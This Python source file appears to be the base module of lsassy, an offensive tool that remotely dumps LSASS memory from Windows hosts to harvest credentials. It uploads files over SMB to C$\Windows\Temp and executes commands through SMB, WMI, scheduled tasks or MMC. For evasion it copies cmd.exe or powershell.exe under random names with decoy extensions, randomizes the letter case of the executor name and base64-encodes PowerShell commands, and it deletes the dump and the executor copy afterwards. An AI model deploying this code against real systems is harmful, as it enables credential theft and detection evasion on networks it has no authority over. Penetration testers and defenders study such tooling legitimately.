import base64
import importlib
import os
import random
import string
import time

from lsassy.impacketfile import ImpacketFile
from lsassy.logger import lsassy_logger


class CustomBuffer:
    def __init__(self):
        self._buffer = b""
        self._currentOffset = 0
        self._total_read = 0

    def read(self, size):
        if self._currentOffset >= len(self._buffer):
            return b""
        self._currentOffset += size
        buff = self._buffer[
            self._currentOffset - size : min(self._currentOffset, len(self._buffer))
        ]
        self._currentOffset = min(self._currentOffset, len(self._buffer))
        return buff

    def write(self, stream):
        self._buffer += stream


class Dependency:
    def __init__(self, name, file=None, content=None):
        self.name = name
        self.file = file
        self.path = False
        self.remote_share = "C$"
        self.remote_path = "\\Windows\\Temp\\"
        self.uploaded = False
        self.content = content
        self.share_mode = False

    def get_remote_path(self):
        return self.remote_path + self.file

    def init(self, options):
        if self.content is not None:
            return True

        self.path = options.get(f"{self.name}_path", self.path)

        if not self.path:
            lsassy_logger.error(f"Missing {self.name}_path")
            return None

        if self.path.startswith("\\\\"):
            # Share provided
            self.remote_path = self.path
            self.file = ""
            self.share_mode = True
            return True
        if not os.path.exists(self.path):
            lsassy_logger.error(f"{self.path} does not exist.")
            return None

        return True

    def upload(self, session):
        # Upload dependency

        if self.share_mode:
            return True

        if self.content is None:
            lsassy_logger.debug(f"Copy {self.path} to {self.remote_path}")
            with open(self.path, "rb") as p:
                try:
                    session.smb_session.putFile(
                        self.remote_share, self.remote_path + self.file, p.read
                    )
                    print(f"{self.name} uploaded")
                    self.uploaded = True
                    return True
                except Exception:
                    lsassy_logger.error(f"{self.name} upload error", exc_info=True)
                    return None
        else:
            if not ImpacketFile.create_file(
                session, self.remote_share, self.remote_path, self.file, self.content
            ):
                lsassy_logger.error(f"{self.name} upload error", exc_info=True)
                return None
            self.uploaded = True
            return True

    def clean(self, session, timeout):
        if self.uploaded:
            ImpacketFile.delete(session, self.remote_path + self.file, timeout=timeout)


class IDumpMethod:
    need_debug_privilege = False
    custom_dump_path_support = True
    custom_dump_name_support = True
    custom_dump_ext_support = True

    dump_name = ""
    dump_ext = ""
    dump_share = "C$"
    dump_path = "\\Windows\\Temp\\"

    exec_methods = ("smb", "wmi", "task", "mmc")

    ext = [
        "csv",
        "db",
        "dbf",
        "log",
        "sav",
        "sql",
        "tar",
        "xml",
        "fnt",
        "fon",
        "otf",
        "ttf",
        "bak",
        "cfg",
        "cpl",
        "cur",
        "dll",
        "drv",
        "icns",
        "ico",
        "ini",
        "lnk",
        "msi",
        "sys",
        "tmp",
        "doc",
        "docx",
        "odt",
        "pdf",
        "rtf",
        "tex",
        "txt",
        "wpd",
        "png",
        "jpg",
        "vhd",
        "vhdx",
        "avhd",
        "avhdx",
        "vsv",
        "iso",
        "rct",
        "vmcx",
        "vmrs",
    ]

    def __init__(self, session, timeout, time_between_commands, *args, **kwargs):
        self._session = session
        self._file = ImpacketFile(self._session)
        self._file_handle = None
        self._executor_name = ""
        self._executor_path = ""
        self._executor_copied = False
        self._timeout = timeout
        self._time_between_commands = time_between_commands

    def get_exec_method(self, exec_method, no_powershell=False):
        try:
            exec_method = importlib.import_module(
                f"lsassy.exec.{exec_method.lower()}", "Exec"
            ).Exec(self._session)
        except ModuleNotFoundError:
            lsassy_logger.error(
                f"Exec module '{exec_method.lower()}' doesn't exist",
                exc_info=True,
            )
            return None

        if not self.need_debug_privilege or exec_method.debug_privilege:
            return exec_method

        if no_powershell:
            return None

        return exec_method

    def get_commands(self):
        raise NotImplementedError

    def prepare(self, options):
        return True

    def prepare_dependencies(self, options, dependencies):
        if None in (d.init(options) for d in dependencies):
            return None
        if None in (d.upload(self._session) for d in dependencies):
            return None
        return True

    def clean(self):
        return True

    def clean_file(self, remote_path, filename):
        ImpacketFile.delete(
            self._session, remote_path + filename, timeout=self._timeout
        )

    def clean_dependencies(self, dependencies):
        [d.clean(self._session, self._timeout) for d in dependencies]

    def exec_method(self):
        return self.need_debug_privilege

    def executor_copy(self, executor):
        executor_locations = {
            "powershell": "\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
            "cmd": "\\Windows\\System32\\cmd.exe",
        }
        if executor not in executor_locations:
            return None

        self._executor_name = (
            "".join(
                random.choice(string.ascii_letters + string.digits) for _ in range(8)
            )
            + "."
            + random.choice(IDumpMethod.ext)
        )
        self._executor_path = "\\Windows\\Temp\\"
        try:
            lsassy_logger.info(f"Opening {executor}")
            buff = CustomBuffer()
            self._session.smb_session.getFile(
                "C$", executor_locations[executor], buff.write
            )
            self._session.smb_session.putFile(
                "C$", self._executor_path + self._executor_name, buff.read
            )
            print(f"{executor} copied as {self._executor_name}")
            self._executor_copied = True
            return True
        except Exception:
            lsassy_logger.debug(
                f"An error occurred while copying {executor}", exc_info=True
            )
            self._executor_path = ""
            self._executor_name = executor + ".exe"
            return None

    def executor_clean(self):
        if self._executor_copied:
            ImpacketFile.delete(
                self._session,
                self._executor_path + self._executor_name,
                timeout=self._timeout,
            )
            lsassy_logger.debug("Executor copy deleted")

    def build_exec_command(
        self, commands, exec_method, no_powershell=False, copy=False
    ):
        lsassy_logger.debug(
            f"Building command - Exec Method has seDebugPrivilege: {exec_method.debug_privilege} | seDebugPrivilege needed: {self.need_debug_privilege} | Powershell allowed: {not no_powershell} | Copy executor: {copy}"
        )
        if commands["cmd"] is not None and (
            not self.need_debug_privilege or exec_method.debug_privilege
        ):
            if not isinstance(commands["cmd"], list):
                commands["cmd"] = [commands["cmd"]]
            self._executor_name = "cmd.exe"
            if copy:
                self.executor_copy("cmd")
            lsassy_logger.debug(commands["cmd"])
            executor_commands = [f"""/Q /c {command}""" for command in commands["cmd"]]
        elif commands["pwsh"] is not None and not no_powershell:
            if not isinstance(commands["pwsh"], list):
                commands["pwsh"] = [commands["pwsh"]]
            self._executor_name = "powershell.exe"
            if copy:
                self.executor_copy("powershell")
            lsassy_logger.debug(commands["pwsh"])
            executor_commands = [
                "-NoP -Enc {}".format(
                    base64.b64encode(command.encode("UTF-16LE")).decode("utf-8")
                )
                for command in commands["pwsh"]
            ]
        else:
            lsassy_logger.error("Shouldn't fall here. Incompatible constraints")
            return None

        self._executor_name = "".join(
            random.choice([str.upper, str.lower])(c) for c in self._executor_name
        )
        return [
            f"{self._executor_path}{self._executor_name} {command}"
            for command in executor_commands
        ]

    def dump(
        self,
        dump_path=None,
        dump_name=None,
        no_powershell=False,
        copy=False,
        exec_methods=None,
        **kwargs,
    ):
        lsassy_logger.info(f"Dumping via {self.__module__}")
        if exec_methods is not None:
            self.exec_methods = exec_methods

        if dump_name is not None:
            if not self.custom_dump_name_support:
                lsassy_logger.warning(
                    f"A custom dump name was provided, but dump method {self.__module__} doesn't support custom dump name"
                )
                lsassy_logger.warning(f"Dump file will be {self.dump_name}")
            elif not self.custom_dump_ext_support:
                lsassy_logger.warning(
                    f"A custom dump name was provided, but dump method {self.__module__} doesn't support custom extension"
                )
                lsassy_logger.warning(f"Dump file will be {dump_name}.{self.dump_ext}")
                self.dump_name = f"{dump_name}.{self.dump_ext}"
            else:
                self.dump_name = dump_name
        elif self.dump_name == "":
            ext = IDumpMethod.ext
            if not self.custom_dump_ext_support:
                ext = [self.dump_ext]
            self.dump_name = "{}.{}".format(
                "".join(
                    random.choice(string.ascii_letters + string.digits)
                    for _ in range(random.randint(3, 9))
                ),
                random.choice(ext),
            )

        if dump_path is not None:
            if not self.custom_dump_path_support:
                lsassy_logger.warning(
                    f"A custom dump path was provided, but dump method {self.__module__} doesn't support custom dump path"
                )
                lsassy_logger.warning(
                    f"Dump path will be {self.dump_share}{self.dump_path}"
                )
            else:
                self.dump_path = dump_path

        valid_exec_methods = {}
        for e in self.exec_methods:
            exec_method = self.get_exec_method(e, no_powershell)
            lsassy_logger.debug(f"Exec method: {exec_method}")
            if exec_method is not None and exec_method not in valid_exec_methods:
                valid_exec_methods[e] = exec_method
            else:
                lsassy_logger.debug(f"Exec method '{e}' is not compatible")
        lsassy_logger.debug(f"Exec Methods: {valid_exec_methods}")

        if len(valid_exec_methods) == 0:
            lsassy_logger.error("Current dump constrains cannot be fulfilled")
            lsassy_logger.debug(
                f"Dump class: {self.__module__} (Need SeDebugPrivilege: {self.need_debug_privilege})"
            )
            lsassy_logger.debug(f"Exec methods: {self.exec_methods}")
            lsassy_logger.debug(
                "Powershell allowed: {}".format("No" if no_powershell else "Yes")
            )
            return None

        if self.prepare(kwargs) is None:
            lsassy_logger.error("Module prerequisites could not be processed")
            self.clean()
            return None

        try:
            commands = self.get_commands()
        except NotImplementedError:
            lsassy_logger.warning(
                f"Module '{self.__module__}' hasn't implemented all required methods"
            )
            return None

        if (
            not isinstance(commands, dict)
            or "cmd" not in commands
            or "pwsh" not in commands
        ):
            lsassy_logger.warning(
                "Return value of {} was not expected. Expecting {'cmd':'...', 'pwsh':'...'}"
            )
            return None

        for e, exec_method in valid_exec_methods.items():
            lsassy_logger.info(f"Trying {e} method")
            exec_commands = self.build_exec_command(
                commands, exec_method, no_powershell, copy
            )
            if exec_commands is None:
                # Shouldn't fall there, but if we do, just skip to next execution method
                continue
            try:
                first_execution = True
                for exec_command in exec_commands:
                    if not first_execution:
                        time.sleep(self._time_between_commands)
                    first_execution = False
                    lsassy_logger.debug(f"Transformed command: {exec_command}")
                    res = exec_method.exec(exec_command)
                    self.executor_clean()
                self.clean()
            except Exception:
                lsassy_logger.error(
                    f"Execution method {exec_method.__module__} has failed",
                    exc_info=True,
                )
                continue
            if not res:
                lsassy_logger.error(f"Failed to dump lsass using {e}")
                continue
            self._file_handle = self._file.open(
                self.dump_share, self.dump_path, self.dump_name, timeout=self._timeout
            )
            if self._file_handle is None:
                lsassy_logger.error(f"Failed to dump lsass using {e}")
                continue
            lsassy_logger.info(
                f"Lsass dumped in C:{self.dump_path}{self.dump_name} ({self._file_handle.size()} Bytes)"
            )
            return self._file_handle

        lsassy_logger.error("All execution methods have failed")
        self.clean()
        return None

    def failsafe(self, timeout=3):
        t = time.time()
        while True:
            if self._file_handle is not None:
                self._file_handle.delete(timeout=timeout)
            else:
                try:
                    self._session.smb_session.deleteFile(
                        self.dump_share, self.dump_path + "/" + self.dump_name
                    )
                    lsassy_logger.debug("Lsass dump deleted")
                except Exception as e:
                    if "STATUS_OBJECT_NAME_NOT_FOUND" in str(
                        e
                    ) or "STATUS_NO_SUCH_FILE" in str(e):
                        return True
                    if time.time() - t > timeout:
                        lsassy_logger.warning(
                            "Lsass dump wasn't removed in {}{}".format(
                                self.dump_share, self.dump_path + "/" + self.dump_name
                            ),
                            exc_info=True,
                        )
                        return None
                    lsassy_logger.debug(
                        "Unable to delete lsass dump file {}{}. Retrying...".format(
                            self.dump_share, self.dump_path + "/" + self.dump_name
                        )
                    )
                    time.sleep(0.5)
